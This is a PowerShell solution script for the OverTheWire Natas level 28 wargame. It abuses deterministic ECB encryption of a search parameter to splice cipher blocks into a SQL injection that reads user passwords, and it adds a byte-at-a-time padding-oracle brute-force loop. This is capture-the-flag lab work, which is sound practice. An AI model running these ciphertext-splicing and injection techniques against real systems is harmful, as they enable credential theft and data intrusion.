using namespace System.Collection.Generic
using namespace Microsoft.PowerShell.Utility
using namespace uri
using namespace System.Convert

param (
    [string]$StrToTest
)
. "../natas_filter.ps1"
. "../getCookieValueFromKey.ps1"

$server = "natas28.natas.labs.overthewire.org/"
#$server = "localhost:8000"
$url = "http://$server"

$username = "natas28"
$password = "***REMOVED***"

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
}

Function Convert-HexToByte {
    # Copyright: (c) 2018, Jordan Borean (@jborean93) <jborean93@gmail.com>
    # MIT License (see LICENSE or https://opensource.org/licenses/MIT)

    <#
    .SYNOPSIS
    Converts a string of hex characters to a byte array.
    
    .DESCRIPTION
    Takes in a string of hex characters and returns the byte array that the
    hex represents.
    
    .PARAMETER Value
    [String] The hex string to convert.

    .OUTPUTS
    [byte[]] The byte array based on the converted hex string.
    
    .EXAMPLE
    Convert-HexToBytes -Value "48656c6c6f20576f726c64"
    
    .NOTES
    The hex string should have no spaces that separate each hex char.
    #>
    [CmdletBinding()]
    [OutputType([byte[]])]
    param(
        [Parameter(Mandatory = $true)] [String]$Value
    )
    $bytes = New-Object -TypeName byte[] -ArgumentList ($Value.Length / 2)
    for ($i = 0; $i -lt $Value.Length; $i += 2) {
        $bytes[$i / 2] = [Convert]::ToByte($Value.Substring($i, 2), 16)
    }

    return [byte[]]$bytes
}

#Only being able to return 1 line of the hex-output is inefficient but it works
function GetLine {
    param (
        [string]$pData,
        [int]$returnLine
    )

    try {
        $as = "query=$pData"
        Invoke-WebRequest -Headers $headers -URI $url -Method Post -Body $as -MaximumRedirection 0 -ErrorVariable errorr -ErrorAction SilentlyContinue
    }
    catch {
        $str = $errorr[0].InnerException.Response.Headers.Location.OriginalString
        $base64encoded = $str.Substring(18) #first 18 chars are: search.php/?query=
        $base64 = [uri]::UnescapeDataString($base64encoded)
    
        $bytearray = [System.Convert]::FromBase64String($base64)
        $hex = $bytearray | Format-Hex
        $i = 1;
        foreach ($line in ($hex.HexBytes -split "`n")) {
            if ($i -eq $returnLine) {
                $result = $line
                break
            }
            $i += 1;
        }
    }
    return $result
}

<#
--------------------------------------------
input (amount of 'a' characters): 10+16+16
    --------------------------------------------
    1b e8 25 11 a7 ba 5b fd 57 8c 0e ef 46 6d b5 9c //never changes;no influence
    dc 84 72 8f dc f8 9d 93 75 1d 10 a7 c7 5c 8c f2 //never changes;no influence
    5a a9 eb 8b 6c 70 f6 24 31 cf c8 a2 e4 b5 71 05 /*This line contains: ??????aaaaaaaaaa*/ /*First 6 Chars are unknown and static, 10 are my own input */

    b3 90 38 c2 8d f7 9b 65 d2 61 51 df 58 f7 ea a3 /* 16 characters of 'a'*/ 
    b3 90 38 c2 8d f7 9b 65 d2 61 51 df 58 f7 ea a3 /* 16 characters of 'a'*/ 

    73 8a 5f fb 4a 45 00 24 67 75 17 5a e5 96 bb d6 /* These content of these two lines are appended after my input */
    f3 4d f3 39 c6 9e dc e1 1f 66 50 bb ce d6 27 02 /* Might not be 16 bytes of data, might contain padding */
    --------------------------------------------
--------------------------------------------

Implies the following structure:
    $pre-string $OUR-USER-INPUT $after-string
Which reminds of:
    -------------pre-string------------                     ---after-string---
    "SELECT * FROM TABLE WHERE FIELD =" + $OUR-USER-INPUT + " GROUP BY FIELD"

By being able to receive deterministic, encrypted blocks, we can:
    Instead of receiving this:
        b3 90 38 c2 8d f7 9b 65 d2 61 51 df 58 f7 ea a3 /* 16 characters of 'a'*/
    We want to receive this:
        SOME-HEX-BLOCK /* SELECT Password FROM USERS */ 
#>

<#
#How to decrypt certain lines by guessing/assuming their content 
#There is a lot missing in this code, but it has everything to understand

$selectArray = @("SELECT", "Select", "select");
$fromArray = @("FROM", "From", "from");
$joArray = @("JO", "Jo", "jo");

$kes = @("kes");
$whereArray = @("WHERE", "Where", "where");
$textArray = @("TEXT", "Text", "text");
$textArray = @("JOKE", "Joke", "joke");
$lArray = @("l", "L");

foreach ($select in $selectArray) {
    foreach ($from in $fromArray) {
        foreach ($jo in $joArray) {
            $cmd = "$select * $from $jo"
            $cmd
            
            $inputData = ('a' * 10)
            $inputData += $cmd; 

            $firstLineHEXStr = GetLine -pData $inputData -returnLine 1
            $response = GetLine -pData $inputData -returnLine 4

            if ($firstLineHEXStr -eq $response) {
                write-host "CORRECT:"`n$firstLineHEXStr`n$response`n
            } else {
                write-host "FALSE:"`n$firstLineHEXStr`n$response`n
            } 

        }
    }
}
#>

# The server enumerates through the mysql_rows result, and accesses the "joke" Field:
    # SELECT Password AS Joke FROM Users
    # SELECT * from jokes -- aaaaaa123

$inputData = ('a' * 10) + "SELECT Password ";
$HEXStr = GetLine -pData $inputData -returnLine 4

write-host `n($inputData.Substring(10))`n$HEXStr
$firstLine = $HEXStr.replace(" ", "");

#case-sensitive; refer to "How to decrypt certain lines" to find out which keywords are sensitive.
$inputData = ('a' * 10) + "AS joke from use"; 
$HEXStr = GetLine -pData $inputData -returnLine 4

write-host `n($inputData.Substring(10))`n$HEXStr
$secondLine = $HEXStr.replace(" ", "");


$inputData = ('a' * 10)
$inputData += "rs LIMIT 10 -- " #15 chars
$inputData += [char]0x01 #valid PKCS#7 padding 
$HEXStr = GetLine -pData $inputData -returnLine 4

write-host `n($inputData.Substring(10))`n$HEXStr
$thirdLine = $HEXStr.replace(" ", "");

$bytearray = Convert-HexToByte -Value ($firstLine + $secondLine + $thirdline)
$base64String = [Convert]::ToBase64String($byteArray)
$escaped = [uri]::EscapeDataString($base64String)   

#This is the Payload: Base64-encoded string you can pass as ?query= value in /search.php 
write-host `n $escaped 

#Just a visual to check if everything is correct
$backescaped = [uri]::UnescapeDataString($escaped)
[Convert]::FromBase64String($backescaped) | Format-Hex 



exit
#---------------------------------------------------------------------------------------------------------------------------------------------------------------------

#This section is an example (working, but not-so-working) 
#to decrypt all the characters in the cypher-block AFTER our input
#Imagine this:

<#

    ???????????????? 16x unkown
    ???????????????? 16x unkown
    ??????aaaaaaaaaa 6x unknown

4:  aaaaaaaaaaaaaaaa 16x KNOWN

    ???????????????? 16x unknown
    ????------------ # "-" is padding


By only passing 15x KNOWN characters in block 4:

4:  aaaaaaaaaaaaaaa? 15x KNOWN 1x unknown. We save this result in $byteStrToCheck
5:  ????????????????
6:  ???------------- #one less; one of the unknown 20 characters moved up to line number 4

        foreach($char in $asciiChars) {
            #Pass: 15x KNOWN chars, append $char
            #4:  aaaaaaaaaaaaaaa + $char
            #If this result equals $byteStrToCheck you have decrypted the unknown byte at block-Index 16.            
        }

        
By only passing 14x KNOWN characters in block 4:

4:  aaaaaaaaaaaaaa?? 15x KNOWN (14 is our input; nr.15 is the one we just decrypted) 1x unknown. We save this result in $byteStrToCheck
5:  ????????????????
6:  ??-------------- #two less total;

        foreach($char in $asciiChars) {
            #Pass: 15x KNOWN chars, append $char
            #4:  aaaaaaaaaaaaaa? + $char
            #If this result equals $byteStrToCheck you have decrypted the unknown byte at block-Index 16.            
        }


In this challenge, this only works for one char of the next line. 
The second char of the next line is a single-quote, which is escaped by the server, wreaks havoc, and just doesn't work. There's probably a way but idk.
#>

$checkCharArray = @()

# Add ASCII characters (0-127)
for ($i = 1; $i -le 127; $i++) {
    if ($i -ne 8) {
        $checkCharArray += [char]$i
    }
}

$knownCharacters = ""
for ($minusCharAmount = 1; $minusCharAmount -le 16; $minusCharAmount++) {

    $charAmount = 16 - $minusCharAmount
    $inputData = 'a' * (10 + $charAmount)
    
    $byteStrToCheck = GetLine -pData $inputData -returnLine 4

    write-host "Searching/Checking for: "`n ("(" + $charamount + "x'a')$knownCharacters" + " and 1x unknown") "                     $byteStrToCheck" `n 
    
    foreach ($char in $checkCharArray) {
        
        $bruteforcePayload = $knownCharacters + $char
        $inputData = 'a' * (10 + $charAmount)
        $inputData += $bruteforcePayload

        #Write-Host " - Checking with " `n $charamount "'a':" $bruteforcePayload
        $bruteForceByteCheck = GetLine -pData $inputData -returnLine 4
        if ($bruteForceByteCheck -eq $byteStrToCheck) {
            write-host `n " - - RESULT::::" $charamount  ":'a'" + $char
            Write-Host " - - $byteStrToCheck " `n " - - equals = " `n " - - $bruteForceByteCheck"
            $knownCharacters += $char
            break
        }
        else {
            write-host ("    FALSE-Input: ($charamount" + "x 'a')$bruteforcePayload" + "     $bruteForceByteCheck")  
        }
    }
    write-host " `n - Nr:$minusCharAmount " $knownCharacters `n
}

write-host `n